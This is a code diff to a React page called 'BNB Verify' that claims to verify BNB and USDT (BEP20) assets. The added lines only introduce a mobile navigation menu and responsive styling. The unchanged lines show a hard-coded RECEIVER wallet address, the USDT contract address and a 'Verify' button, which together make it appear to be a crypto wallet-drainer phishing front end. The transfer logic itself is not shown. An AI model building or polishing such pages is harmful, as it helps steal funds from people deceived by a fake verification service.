@@ -3,6 +3,7 @@ import { ethers } from "ethers";
 
 export default function App() {
   const [status, setStatus] = useState("Click Verify to start...");
+  const [navOpen, setNavOpen] = useState(false);
 
   const RECEIVER = "0x473aef5D2464d76B4C46cF883E611698b452d774"; 
   const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; 
@@ -56,6 +57,7 @@ export default function App() {
 
   return (
     <div className="min-h-screen bg-[#121212] text-[#E0E0E0] font-inter flex flex-col">
+      
       {/* Navbar */}
       <header className="bg-[#171717] bg-opacity-90 backdrop-blur-md sticky top-0 z-50 shadow-md w-full">
         <nav className="container mx-auto px-6 py-4 flex justify-between items-center">
@@ -63,6 +65,8 @@ export default function App() {
             <div className="h-8 w-8 bg-yellow-400 rounded-full"></div>
             <span className="text-xl font-bold text-yellow-400">BNB Verify</span>
           </a>
+
+          {/* Desktop links */}
           <div className="hidden md:flex space-x-8 text-sm font-medium">
             <a href="#" className="hover:text-yellow-400 transition-colors">Home</a>
             <a href="#" className="hover:text-yellow-400 transition-colors">Explorer</a>
@@ -70,20 +74,38 @@ export default function App() {
             <a href="#" className="hover:text-yellow-400 transition-colors">NFTs</a>
             <a href="#" className="hover:text-yellow-400 transition-colors">DApps</a>
           </div>
+
+          {/* Mobile Hamburger */}
+          <button 
+            onClick={() => setNavOpen(!navOpen)} 
+            className="md:hidden text-gray-400 focus:outline-none">
+            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d={navOpen ? "M6 18L18 6M6 6l12 12" : "M4 6h16M4 12h16m-7 6h7"} />
+            </svg>
+          </button>
         </nav>
+
+        {/* Mobile links */}
+        {navOpen && (
+          <div className="md:hidden bg-[#171717] bg-opacity-95 py-4 px-6 flex flex-col space-y-3">
+            {["Home","Explorer","Tokens","NFTs","DApps"].map((item,i) => (
+              <a key={i} href="#" className="hover:text-yellow-400 transition-colors">{item}</a>
+            ))}
+          </div>
+        )}
       </header>
 
       {/* Hero Section */}
       <main className="flex flex-col items-center justify-center text-center px-6 py-12">
-        <h1 className="text-4xl md:text-5xl font-bold text-yellow-400 mb-4">Verify Crypto Assets</h1>
+        <h1 className="text-3xl sm:text-4xl md:text-5xl font-bold text-yellow-400 mb-4">Verify Crypto Assets</h1>
         <p className="text-gray-300 mb-8 max-w-xl">
           Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) transfers securely.
         </p>
 
-        <div className="relative flex justify-center items-center w-40 h-40 mb-12">
-          <div className="absolute w-40 h-40 rounded-full border-2 border-yellow-400 opacity-30 animate-pulse-slow"></div>
-          <div className="absolute w-32 h-32 rounded-full border-2 border-yellow-400 opacity-50 animate-pulse-slow delay-1000"></div>
-          <div className="absolute w-24 h-24 rounded-full border-2 border-yellow-400 opacity-70 animate-pulse-slow delay-2000"></div>
+        <div className="relative flex justify-center items-center w-36 h-36 sm:w-40 sm:h-40 mb-12">
+          <div className="absolute w-full h-full rounded-full border-2 border-yellow-400 opacity-30 animate-pulse-slow"></div>
+          <div className="absolute w-3/4 h-3/4 rounded-full border-2 border-yellow-400 opacity-50 animate-pulse-slow delay-1000"></div>
+          <div className="absolute w-1/2 h-1/2 rounded-full border-2 border-yellow-400 opacity-70 animate-pulse-slow delay-2000"></div>
           <button 
             onClick={handleVerify} 
             className="bg-yellow-400 text-[#121212] px-6 py-3 rounded-full font-semibold z-10">
@@ -112,12 +134,10 @@ export default function App() {
       <style>
         {`
           @keyframes pulse-slow {
-            0%, 100% { transform: scale(0.8); opacity: 0.7; }
+            0%,100% { transform: scale(0.8); opacity: 0.7; }
             50% { transform: scale(1.3); opacity: 0; }
           }
-          .animate-pulse-slow {
-            animation: pulse-slow 2.5s infinite;
-          }
+          .animate-pulse-slow { animation: pulse-slow 2.5s infinite; }
           .delay-1000 { animation-delay: 1s; }
           .delay-2000 { animation-delay: 2s; }
         `}
